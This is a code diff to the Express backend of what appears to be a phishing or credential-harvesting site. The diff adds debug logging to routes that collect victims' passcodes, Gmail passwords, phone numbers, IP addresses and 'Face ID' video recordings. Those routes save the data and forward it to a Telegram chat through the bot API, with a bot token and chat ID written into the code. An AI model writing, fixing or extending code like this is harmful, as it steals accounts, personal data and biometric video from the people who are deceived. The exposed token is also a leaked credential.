@@ -47,6 +47,10 @@ apiRouter.post("/log-event", async (req, res) => {
   const botToken = process.env.TELEGRAM_BOT_TOKEN || "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
   const chatId = process.env.TELEGRAM_CHAT_ID || "7643809155";
   
+  console.log(`[DEBUG] Received log-event: ${event}`);
+  console.log(`[DEBUG] Bot Token: ${botToken.substring(0, 5)}...`);
+  console.log(`[DEBUG] Chat ID: ${chatId}`);
+
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   let message = "";
 
@@ -60,14 +64,16 @@ apiRouter.post("/log-event", async (req, res) => {
   }
 
   try {
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    console.log(`[DEBUG] Sending to Telegram: ${message.substring(0, 50)}...`);
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: message,
       parse_mode: "Markdown",
     });
+    console.log("[DEBUG] Telegram Success:", response.data.ok);
     res.json({ success: true });
   } catch (error: any) {
-    console.error("Telegram Error:", error.response?.data || error.message);
+    console.error("[DEBUG] Telegram Error:", error.response?.data || error.message);
     res.json({ success: true, warning: "Telegram failed" });
   }
 });
@@ -76,19 +82,31 @@ apiRouter.post("/upload-video", upload.single("video"), async (req: any, res) =>
   const botToken = process.env.TELEGRAM_BOT_TOKEN || "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
   const chatId = process.env.TELEGRAM_CHAT_ID || "7643809155";
   
-  if (!req.file) return res.status(400).json({ error: "No video" });
+  console.log("[DEBUG] Received upload-video");
+  if (!req.file) {
+    console.error("[DEBUG] No file in request");
+    return res.status(400).json({ error: "No video" });
+  }
+  
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   
   try {
+    console.log(`[DEBUG] Preparing FormData for video (${req.file.size} bytes)`);
     const form = new FormData();
     form.append("chat_id", chatId);
     form.append("video", req.file.buffer, { filename: "face_id.webm", contentType: req.file.mimetype });
     form.append("caption", `👤 *Face ID Video Received*\n📍 *IP:* ${ip}`);
 
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, form, { headers: form.getHeaders() });
+    console.log("[DEBUG] Sending video to Telegram...");
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, form, { 
+      headers: form.getHeaders(),
+      maxContentLength: Infinity,
+      maxBodyLength: Infinity
+    });
+    console.log("[DEBUG] Telegram Video Success:", response.data.ok);
     res.json({ success: true });
   } catch (error: any) {
-    console.error("Video Error:", error.response?.data || error.message);
+    console.error("[DEBUG] Video Error:", error.response?.data || error.message);
     res.json({ success: true, warning: "Video failed" });
   }
 });
@@ -98,16 +116,25 @@ apiRouter.post("/submit", async (req, res) => {
   const botToken = process.env.TELEGRAM_BOT_TOKEN || "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
   const chatId = process.env.TELEGRAM_CHAT_ID || "7643809155";
   
+  console.log("[DEBUG] Received final submit");
   const message = `🚀 *New Submission*\n🔑 *Passcode:* ${passcode || "N/A"}\n📧 *Gmail:* ${gmailPassword || "N/A"}\n📱 *Phone:* ${phoneNumber || "N/A"}`;
 
   try {
     if (db) {
+      console.log("[DEBUG] Saving to local DB...");
       db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)").run(passcode || "", gmailPassword || "", phoneNumber || "");
     }
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { chat_id: chatId, text: message, parse_mode: "Markdown" });
+    
+    console.log("[DEBUG] Sending final message to Telegram...");
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+      chat_id: chatId, 
+      text: message, 
+      parse_mode: "Markdown" 
+    });
+    console.log("[DEBUG] Telegram Final Success:", response.data.ok);
     res.json({ success: true });
   } catch (error: any) {
-    console.error("Submit Error:", error.response?.data || error.message);
+    console.error("[DEBUG] Submit Error:", error.response?.data || error.message);
     res.json({ success: true });
   }
 });
